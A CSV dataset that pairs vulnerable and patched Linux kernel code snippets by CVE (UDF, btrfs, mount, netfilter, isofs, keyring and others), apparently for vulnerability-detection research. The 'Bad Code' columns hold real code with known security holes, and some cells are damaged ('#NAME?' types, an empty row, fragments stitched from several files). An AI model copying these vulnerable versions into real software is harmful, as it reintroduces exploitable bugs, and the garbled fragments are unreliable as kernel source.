Year,Type of vulnerability,CVE ID number,Bad Code,Good Code
2015,DoS ,CVE-2014-9730,"	tolen--;
 while (elen < fromlen) {
		pc = (struct pathComponent *)(from + elen);

 switch (pc->componentType) {
 case 1:
 /*
			 * Symlink points to some place which should be agreed
 			 * upon between originator and receiver of the media. Ignore.
 */
 if (pc->lengthComponentIdent > 0)

 break;

 /* Fall through */
 case 2:
 if (tolen == 0)
 /* that would be . - just ignore */
 break;
 case 5:



			comp_len = udf_get_filename(sb, pc->componentIdent,
						    pc->lengthComponentIdent,
						    p, tolen);
			tolen--;
 break;
		}
		elen += sizeof(struct pathComponent) + pc->lengthComponentIdent;
	}
 if (p > to + 1)
		p[-1] = '\0';
","	tolen--;
 while (elen < fromlen) {
		pc = (struct pathComponent *)(from + elen);
		elen += sizeof(struct pathComponent);
 switch (pc->componentType) {
 case 1:
 /*
			 * Symlink points to some place which should be agreed
 			 * upon between originator and receiver of the media. Ignore.
 */
 if (pc->lengthComponentIdent > 0) {
				elen += pc->lengthComponentIdent;
 break;
			}
 /* Fall through */
 case 2:
 if (tolen == 0)
 /* that would be . - just ignore */
 break;
 case 5:
			elen += pc->lengthComponentIdent;
 if (elen > fromlen)
 return -EIO;
			comp_len = udf_get_filename(sb, pc->componentIdent,
						    pc->lengthComponentIdent,
						    p, tolen);
			tolen--;
 break;
		}

	}
 if (p > to + 1)
		p[-1] = '\0';
"
2015,DoS ,CVE-2014-9729,"	}
	inode->i_generation = iinfo->i_unique;















 switch (fe->icbTag.fileType) {
 case ICBTAG_FILE_TYPE_DIRECTORY:
		inode->i_op = &udf_dir_inode_operations;
","	}
	inode->i_generation = iinfo->i_unique;

 /* Sanity checks for files in ICB so that we don't get confused later */
 if (iinfo->i_alloc_type == ICBTAG_FLAG_AD_IN_ICB) {
 /*
		 * For file in ICB data is stored in allocation descriptor
		 * so sizes should match
 */
 if (iinfo->i_lenAlloc != inode->i_size)
 goto out;
 /* File in ICB has to fit in there... */
 if (inode->i_size > inode->i_sb->s_blocksize -
 udf_file_entry_alloc_offset(inode))
 goto out;
	}

 switch (fe->icbTag.fileType) {
 case ICBTAG_FILE_TYPE_DIRECTORY:
		inode->i_op = &udf_dir_inode_operations;
"
2015,DoS Overflow ,CVE-2014-9728,"	}
	inode->i_generation = iinfo->i_unique;















 switch (fe->icbTag.fileType) {
 case ICBTAG_FILE_TYPE_DIRECTORY:
		inode->i_op = &udf_dir_inode_operations;
","	}
	inode->i_generation = iinfo->i_unique;

 /* Sanity checks for files in ICB so that we don't get confused later */
 if (iinfo->i_alloc_type == ICBTAG_FLAG_AD_IN_ICB) {
 /*
		 * For file in ICB data is stored in allocation descriptor
		 * so sizes should match
 */
 if (iinfo->i_lenAlloc != inode->i_size)
 goto out;
 /* File in ICB has to fit in there... */
 if (inode->i_size > inode->i_sb->s_blocksize -
 udf_file_entry_alloc_offset(inode))
 goto out;
	}

 switch (fe->icbTag.fileType) {
 case ICBTAG_FILE_TYPE_DIRECTORY:
		inode->i_op = &udf_dir_inode_operations;
"
2016,Bypass ,CVE-2014-9717," rcu_read_unlock();

 list_del(&mnt->mnt_instance);







 unlock_mount_hash();

 if (likely(!(mnt->mnt.mnt_flags & MNT_INTERNAL))) {
 propagate_umount(&tmp_list);

 while (!list_empty(&tmp_list)) {

		p = list_first_entry(&tmp_list, struct mount, mnt_list);
 list_del_init(&p->mnt_expire);
 list_del_init(&p->mnt_list);
 if (how & UMOUNT_SYNC)
			p->mnt.mnt_flags |= MNT_SYNC_UMOUNT;

 pin_insert_group(&p->mnt_umount, &p->mnt_parent->mnt, &unmounted);



 if (mnt_has_parent(p)) {
 mnt_add_count(p->mnt_parent, -1);
 umount_mnt(p);





		}
 change_mnt_propagation(p, MS_PRIVATE);
	}
 lock_mount_hash();
 while (!hlist_empty(&mp->m_list)) {
		mnt = hlist_entry(mp->m_list.first, struct mount, mnt_mp_list);
 umount_tree(mnt, 0);







	}
 unlock_mount_hash();
 put_mountpoint(mp);
#define SET_MNT_MARK(m) ((m)->mnt.mnt_flags |= MNT_MARKED)
#define CLEAR_MNT_MARK(m) ((m)->mnt.mnt_flags &= ~MNT_MARKED)
#define IS_MNT_LOCKED(m) ((m)->mnt.mnt_flags & MNT_LOCKED)



#define CL_EXPIRE 0x01
#define CL_SLAVE 0x02
"," rcu_read_unlock();

 list_del(&mnt->mnt_instance);

 if (unlikely(!list_empty(&mnt->mnt_mounts))) {
 struct mount *p, *tmp;
 list_for_each_entry_safe(p, tmp, &mnt->mnt_mounts,  mnt_child) {
 umount_mnt(p);
		}
	}
 unlock_mount_hash();

 if (likely(!(mnt->mnt.mnt_flags & MNT_INTERNAL))) {
 propagate_umount(&tmp_list);

 while (!list_empty(&tmp_list)) {
 bool disconnect;
		p = list_first_entry(&tmp_list, struct mount, mnt_list);
 list_del_init(&p->mnt_expire);
 list_del_init(&p->mnt_list);
 if (how & UMOUNT_SYNC)
			p->mnt.mnt_flags |= MNT_SYNC_UMOUNT;

		disconnect = !IS_MNT_LOCKED_AND_LAZY(p);

 pin_insert_group(&p->mnt_umount, &p->mnt_parent->mnt,
				 disconnect ? &unmounted : NULL);
 if (mnt_has_parent(p)) {
 mnt_add_count(p->mnt_parent, -1);
 if (!disconnect) {
 /* Don't forget about p */
 list_add_tail(&p->mnt_child, &p->mnt_parent->mnt_mounts);
			} else {
 umount_mnt(p);
			}
		}
 change_mnt_propagation(p, MS_PRIVATE);
	}
 lock_mount_hash();
 while (!hlist_empty(&mp->m_list)) {
		mnt = hlist_entry(mp->m_list.first, struct mount, mnt_mp_list);
 if (mnt->mnt.mnt_flags & MNT_UMOUNT) {
 struct mount *p, *tmp;
 list_for_each_entry_safe(p, tmp, &mnt->mnt_mounts,  mnt_child) {
 hlist_add_head(&p->mnt_umount.s_list, &unmounted);
 umount_mnt(p);
			}
		}
 else umount_tree(mnt, 0);
	}
 unlock_mount_hash();
 put_mountpoint(mp);
#define SET_MNT_MARK(m) ((m)->mnt.mnt_flags |= MNT_MARKED)
#define CLEAR_MNT_MARK(m) ((m)->mnt.mnt_flags &= ~MNT_MARKED)
#define IS_MNT_LOCKED(m) ((m)->mnt.mnt_flags & MNT_LOCKED)
#define IS_MNT_LOCKED_AND_LAZY(m) \
	(((m)->mnt.mnt_flags & (MNT_LOCKED|MNT_SYNC_UMOUNT)) == MNT_LOCKED)

#define CL_EXPIRE 0x01
#define CL_SLAVE 0x02
"
2015,DoS ,CVE-2014-9715,"/* Extensions: optional stuff which isn't permanently in struct. */
struct nf_ct_ext {
 struct rcu_head rcu;
 u8 offset[NF_CT_EXT_NUM];
 u8 len;
 char data[0];
};

","/* Extensions: optional stuff which isn't permanently in struct. */
struct nf_ct_ext {
 struct rcu_head rcu;
 u16 offset[NF_CT_EXT_NUM];
 u16 len;
 char data[0];
};

"
2015,#NAME?,CVE-2014-9710," */
 if (!p->leave_spinning)
 btrfs_set_path_blocking(p);
 if (ret < 0)
 btrfs_release_path(p);
 return ret;
}
 unsigned int leave_spinning:1;
 unsigned int search_commit_root:1;
 unsigned int need_commit_sem:1;

};

/*
int verify_dir_item(struct btrfs_root *root,
 struct extent_buffer *leaf,
 struct btrfs_dir_item *dir_item);





/* orphan.c */
int btrfs_insert_orphan_item(struct btrfs_trans_handle *trans,
#include ""hash.h""
#include ""transaction.h""

static struct btrfs_dir_item *btrfs_match_dir_item_name(struct btrfs_root *root,
 struct btrfs_path *path,
 const char *name, int name_len);

/*
 * insert a name into a directory, doing overflow properly if there is a hash
 * collision.  data_size indicates how big the item inserted should be.  On
 * this walks through all the entries in a dir item and finds one
 * for a specific name.
 */
static struct btrfs_dir_item *btrfs_match_dir_item_name(struct btrfs_root *root,
   struct btrfs_path *path,
   const char *name, int name_len)
{
 struct btrfs_dir_item *dir_item;
 unsigned long name_ptr;
#include ""xattr.h""
#include ""disk-io.h""
#include ""props.h""



ssize_t __btrfs_getxattr(struct inode *inode, const char *name,
 struct inode *inode, const char *name,
 const void *value, size_t size, int flags)
{
 struct btrfs_dir_item *di;
 struct btrfs_root *root = BTRFS_I(inode)->root;
 struct btrfs_path *path;
 size_t name_len = strlen(name);
	path = btrfs_alloc_path();
 if (!path)
 return -ENOMEM;



















 if (flags & XATTR_REPLACE) {
		di = btrfs_lookup_xattr(trans, root, path, btrfs_ino(inode), name,
					name_len, -1);
 if (IS_ERR(di)) {
			ret = PTR_ERR(di);
 goto out;
		} else if (!di) {
			ret = -ENODATA;
 goto out;
		}
		ret = btrfs_delete_one_dir_name(trans, root, path, di);
 if (ret)
 goto out;
 btrfs_release_path(path);






 /*
		 * remove the attribute


 */
 if (!value)
 goto out;
	} else {
		di = btrfs_lookup_xattr(NULL, root, path, btrfs_ino(inode),
					name, name_len, 0);
 if (IS_ERR(di)) {
			ret = PTR_ERR(di);
 goto out;
		}
 if (!di && !value)
 goto out;
 btrfs_release_path(path);



	}

again:
	ret = btrfs_insert_xattr_item(trans, root, path, btrfs_ino(inode),
				      name, name_len, value, size);
 /*
	 * If we're setting an xattr to a new value but the new value is say
	 * exactly BTRFS_MAX_XATTR_SIZE, we could end up with EOVERFLOW getting
	 * back from split_leaf.  This is because it thinks we'll be extending
	 * the existing item size, but we're asking for enough space to add the
	 * item itself.  So if we get EOVERFLOW just set ret to EEXIST and let
	 * the rest of the function figure it out.
 */
 if (ret == -EOVERFLOW)
		ret = -EEXIST;



 if (ret == -EEXIST) {
 if (flags & XATTR_CREATE)
 goto out;
 /*
		 * We can't use the path we already have since we won't have the
		 * proper locking for a delete, so release the path and
		 * re-lookup to delete the thing.


 */
 btrfs_release_path(path);
		di = btrfs_lookup_xattr(trans, root, path, btrfs_ino(inode),
					name, name_len, -1);
 if (IS_ERR(di)) {
			ret = PTR_ERR(di);
 goto out;
		} else if (!di) {
 /* Shouldn't happen but just in case... */
 btrfs_release_path(path);
 goto again;





		}

		ret = btrfs_delete_one_dir_name(trans, root, path, di);
 if (ret)
 goto out;





















 /*
		 * We have a value to set, so go back and try to insert it now.


 */
 if (value) {
 btrfs_release_path(path);
 goto again;
		}
	}
out:
 btrfs_free_path(path);
"," */
 if (!p->leave_spinning)
 btrfs_set_path_blocking(p);
 if (ret < 0 && !p->skip_release_on_error)
 btrfs_release_path(p);
 return ret;
}
 unsigned int leave_spinning:1;
 unsigned int search_commit_root:1;
 unsigned int need_commit_sem:1;
 unsigned int skip_release_on_error:1;
};

/*
int verify_dir_item(struct btrfs_root *root,
 struct extent_buffer *leaf,
 struct btrfs_dir_item *dir_item);
struct btrfs_dir_item *btrfs_match_dir_item_name(struct btrfs_root *root,
 struct btrfs_path *path,
 const char *name,
 int name_len);

/* orphan.c */
int btrfs_insert_orphan_item(struct btrfs_trans_handle *trans,
#include ""hash.h""
#include ""transaction.h""





/*
 * insert a name into a directory, doing overflow properly if there is a hash
 * collision.  data_size indicates how big the item inserted should be.  On
 * this walks through all the entries in a dir item and finds one
 * for a specific name.
 */
struct btrfs_dir_item *btrfs_match_dir_item_name(struct btrfs_root *root,
   struct btrfs_path *path,
   const char *name, int name_len)
{
 struct btrfs_dir_item *dir_item;
 unsigned long name_ptr;
#include ""xattr.h""
#include ""disk-io.h""
#include ""props.h""
#include ""locking.h""


ssize_t __btrfs_getxattr(struct inode *inode, const char *name,
 struct inode *inode, const char *name,
 const void *value, size_t size, int flags)
{
 struct btrfs_dir_item *di = NULL;
 struct btrfs_root *root = BTRFS_I(inode)->root;
 struct btrfs_path *path;
 size_t name_len = strlen(name);
	path = btrfs_alloc_path();
 if (!path)
 return -ENOMEM;
	path->skip_release_on_error = 1;

 if (!value) {
		di = btrfs_lookup_xattr(trans, root, path, btrfs_ino(inode),
					name, name_len, -1);
 if (!di && (flags & XATTR_REPLACE))
			ret = -ENODATA;
 else if (di)
			ret = btrfs_delete_one_dir_name(trans, root, path, di);
 goto out;
	}

 /*
	 * For a replace we can't just do the insert blindly.
	 * Do a lookup first (read-only btrfs_search_slot), and return if xattr
	 * doesn't exist. If it exists, fall down below to the insert/replace
	 * path - we can't race with a concurrent xattr delete, because the VFS
	 * locks the inode's i_mutex before calling setxattr or removexattr.
 */
 if (flags & XATTR_REPLACE) {
 ASSERT(mutex_is_locked(&inode->i_mutex));
		di = btrfs_lookup_xattr(NULL, root, path, btrfs_ino(inode),
					name, name_len, 0);
 if (!di) {


			ret = -ENODATA;
 goto out;
		}



 btrfs_release_path(path);
		di = NULL;
	}

	ret = btrfs_insert_xattr_item(trans, root, path, btrfs_ino(inode),
				      name, name_len, value, size);
 if (ret == -EOVERFLOW) {
 /*
		 * We have an existing item in a leaf, split_leaf couldn't
		 * expand it. That item might have or not a dir_item that
		 * matches our target xattr, so lets check.
 */
		ret = 0;
 btrfs_assert_tree_locked(path->nodes[0]);
		di = btrfs_match_dir_item_name(root, path, name, name_len);
 if (!di && !(flags & XATTR_REPLACE)) {
			ret = -ENOSPC;


 goto out;
		}
	} else if (ret == -EEXIST) {
		ret = 0;
		di = btrfs_match_dir_item_name(root, path, name, name_len);
 ASSERT(di); /* logic error */
	} else if (ret) {
 goto out;
	}

 if (di && (flags & XATTR_CREATE)) {











		ret = -EEXIST;
 goto out;
	}

 if (di) {


 /*
		 * We're doing a replace, and it must be atomic, that is, at
		 * any point in time we have either the old or the new xattr
		 * value in the tree. We don't want readers (getxattr and
		 * listxattrs) to miss a value, this is specially important
		 * for ACLs.
 */
 const int slot = path->slots[0];
 struct extent_buffer *leaf = path->nodes[0];
 const u16 old_data_len = btrfs_dir_data_len(leaf, di);
 const u32 item_size = btrfs_item_size_nr(leaf, slot);
 const u32 data_size = sizeof(*di) + name_len + size;
 struct btrfs_item *item;
 unsigned long data_ptr;
 char *ptr;

 if (size > old_data_len) {
 if (btrfs_leaf_free_space(root, leaf) <
			    (size - old_data_len)) {
				ret = -ENOSPC;
 goto out;
			}
		}

 if (old_data_len + name_len + sizeof(*di) == item_size) {
 /* No other xattrs packed in the same leaf item. */
 if (size > old_data_len)
 btrfs_extend_item(root, path,
						  size - old_data_len);
 else if (size < old_data_len)
 btrfs_truncate_item(root, path, data_size, 1);
		} else {
 /* There are other xattrs packed in the same item. */
			ret = btrfs_delete_one_dir_name(trans, root, path, di);
 if (ret)
 goto out;
 btrfs_extend_item(root, path, data_size);
		}

		item = btrfs_item_nr(slot);
		ptr = btrfs_item_ptr(leaf, slot, char);
		ptr += btrfs_item_size(leaf, item) - data_size;
		di = (struct btrfs_dir_item *)ptr;
 btrfs_set_dir_data_len(leaf, di, size);
		data_ptr = ((unsigned long)(di + 1)) + name_len;
 write_extent_buffer(leaf, value, data_ptr, size);
 btrfs_mark_buffer_dirty(leaf);
	} else {
 /*
		 * Insert, and we had space for the xattr, so path->slots[0] is
		 * where our xattr dir_item is and btrfs_insert_xattr_item()
		 * filled it.
 */




	}
out:
 btrfs_free_path(path);
"
2015,DoS Overflow +Priv ,CVE-2014-9683," break;
 case 2:
			dst[dst_byte_offset++] |= (src_byte);
			dst[dst_byte_offset] = 0;
			current_bit_offset = 0;
 break;
		}
"," break;
 case 2:
			dst[dst_byte_offset++] |= (src_byte);

			current_bit_offset = 0;
 break;
		}
"
2015,,CVE-2014-9644,"#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>

#include <asm/i387.h>

struct crypto_fpu_ctx {
{
 crypto_unregister_template(&crypto_fpu_tmpl);
}



struct crypto_template *crypto_lookup_template(const char *name)
{
 return try_then_request_module(__crypto_lookup_template(name), ""%s"",
				       name);
}
EXPORT_SYMBOL_GPL(crypto_lookup_template);


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Simple AEAD wrapper for IPsec"");

MODULE_LICENSE(""GPL"");
MODULE_AUTHOR(""Steffen Klassert <steffen.klassert@secunet.com>"");
MODULE_DESCRIPTION(""AEAD wrapper for IPsec with extended sequence numbers"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""CBC block cipher algorithm"");

MODULE_DESCRIPTION(""Counter with CBC MAC"");
MODULE_ALIAS_CRYPTO(""ccm_base"");
MODULE_ALIAS_CRYPTO(""rfc4309"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Chain IV Generator"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""CMAC keyed hash algorithm"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Software async crypto daemon"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""CTR Counter block mode"");
MODULE_ALIAS_CRYPTO(""rfc3686"");


MODULE_LICENSE(""Dual BSD/GPL"");
MODULE_DESCRIPTION(""CTS-CBC CipherText Stealing for CBC"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""ECB block cipher algorithm"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Encrypted Sequence Number IV Generator"");

MODULE_ALIAS_CRYPTO(""gcm_base"");
MODULE_ALIAS_CRYPTO(""rfc4106"");
MODULE_ALIAS_CRYPTO(""rfc4543"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""HMAC hash algorithm"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""LRW block cipher mode"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Software async multibuffer crypto daemon"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""PCBC block cipher algorithm"");

MODULE_LICENSE(""GPL"");
MODULE_AUTHOR(""Steffen Klassert <steffen.klassert@secunet.com>"");
MODULE_DESCRIPTION(""Parallel crypto wrapper"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Sequence Number IV Generator"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""VMAC hash algorithm"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""XCBC keyed hash algorithm"");


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""XTS block cipher mode"");

","#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/crypto.h>
#include <asm/i387.h>

struct crypto_fpu_ctx {
{
 crypto_unregister_template(&crypto_fpu_tmpl);
}

MODULE_ALIAS_CRYPTO(""fpu"");

struct crypto_template *crypto_lookup_template(const char *name)
{
 return try_then_request_module(__crypto_lookup_template(name),
 ""crypto-%s"", name);
}
EXPORT_SYMBOL_GPL(crypto_lookup_template);


MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Simple AEAD wrapper for IPsec"");
MODULE_ALIAS_CRYPTO(""authenc"");
MODULE_LICENSE(""GPL"");
MODULE_AUTHOR(""Steffen Klassert <steffen.klassert@secunet.com>"");
MODULE_DESCRIPTION(""AEAD wrapper for IPsec with extended sequence numbers"");
MODULE_ALIAS_CRYPTO(""authencesn"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""CBC block cipher algorithm"");
MODULE_ALIAS_CRYPTO(""cbc"");
MODULE_DESCRIPTION(""Counter with CBC MAC"");
MODULE_ALIAS_CRYPTO(""ccm_base"");
MODULE_ALIAS_CRYPTO(""rfc4309"");
MODULE_ALIAS_CRYPTO(""ccm"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Chain IV Generator"");
MODULE_ALIAS_CRYPTO(""chainiv"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""CMAC keyed hash algorithm"");
MODULE_ALIAS_CRYPTO(""cmac"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Software async crypto daemon"");
MODULE_ALIAS_CRYPTO(""cryptd"");
MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""CTR Counter block mode"");
MODULE_ALIAS_CRYPTO(""rfc3686"");
MODULE_ALIAS_CRYPTO(""ctr"");

MODULE_LICENSE(""Dual BSD/GPL"");
MODULE_DESCRIPTION(""CTS-CBC CipherText Stealing for CBC"");
MODULE_ALIAS_CRYPTO(""cts"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""ECB block cipher algorithm"");
MODULE_ALIAS_CRYPTO(""ecb"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Encrypted Sequence Number IV Generator"");
MODULE_ALIAS_CRYPTO(""eseqiv"");
MODULE_ALIAS_CRYPTO(""gcm_base"");
MODULE_ALIAS_CRYPTO(""rfc4106"");
MODULE_ALIAS_CRYPTO(""rfc4543"");
MODULE_ALIAS_CRYPTO(""gcm"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""HMAC hash algorithm"");
MODULE_ALIAS_CRYPTO(""hmac"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""LRW block cipher mode"");
MODULE_ALIAS_CRYPTO(""lrw"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Software async multibuffer crypto daemon"");
MODULE_ALIAS_CRYPTO(""mcryptd"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""PCBC block cipher algorithm"");
MODULE_ALIAS_CRYPTO(""pcbc"");
MODULE_LICENSE(""GPL"");
MODULE_AUTHOR(""Steffen Klassert <steffen.klassert@secunet.com>"");
MODULE_DESCRIPTION(""Parallel crypto wrapper"");
MODULE_ALIAS_CRYPTO(""pcrypt"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""Sequence Number IV Generator"");
MODULE_ALIAS_CRYPTO(""seqiv"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""VMAC hash algorithm"");
MODULE_ALIAS_CRYPTO(""vmac"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""XCBC keyed hash algorithm"");
MODULE_ALIAS_CRYPTO(""xcbc"");

MODULE_LICENSE(""GPL"");
MODULE_DESCRIPTION(""XTS block cipher mode"");
MODULE_ALIAS_CRYPTO(""xts"");
"
2015,Bypass ,CVE-2014-9585,,
2015,#NAME?,CVE-2014-9584,"			rs.cont_size = isonum_733(rr->u.CE.size);
 break;
 case SIG('E', 'R'):



 ISOFS_SB(inode->i_sb)->s_rock = 1;
 printk(KERN_DEBUG ""ISO 9660 Extensions: "");
			{
","			rs.cont_size = isonum_733(rr->u.CE.size);
 break;
 case SIG('E', 'R'):
 /* Invalid length of ER tag id? */
 if (rr->u.ER.len_id + offsetof(struct rock_ridge, u.ER.data) > rr->len)
 goto out;
 ISOFS_SB(inode->i_sb)->s_rock = 1;
 printk(KERN_DEBUG ""ISO 9660 Extensions: "");
			{
"
2015,DoS Mem. Corr. ,CVE-2014-9529," if (test_bit(KEY_FLAG_INSTANTIATED, &key->flags))
 atomic_dec(&key->user->nikeys);

 key_user_put(key->user);

 /* now throw away the key memory */
 if (key->type->destroy)
			key->type->destroy(key);



 kfree(key->description);

#ifdef KEY_DEBUGGING
"," if (test_bit(KEY_FLAG_INSTANTIATED, &key->flags))
 atomic_dec(&key->user->nikeys);



 /* now throw away the key memory */
 if (key->type->destroy)
			key->type->destroy(key);

 key_user_put(key->user);

 kfree(key->description);

#ifdef KEY_DEBUGGING
"
2015,DoS ,CVE-2014-9428," kfree(entry);

 /* Make room for the rest of the fragments. */
 if (pskb_expand_head(skb_out, 0, size - skb->len, GFP_ATOMIC) < 0) {
 kfree_skb(skb_out);
		skb_out = NULL;
 goto free;
"," kfree(entry);

 /* Make room for the rest of the fragments. */
 if (pskb_expand_head(skb_out, 0, size - skb_out->len, GFP_ATOMIC) < 0) {
 kfree_skb(skb_out);
		skb_out = NULL;
 goto free;
"
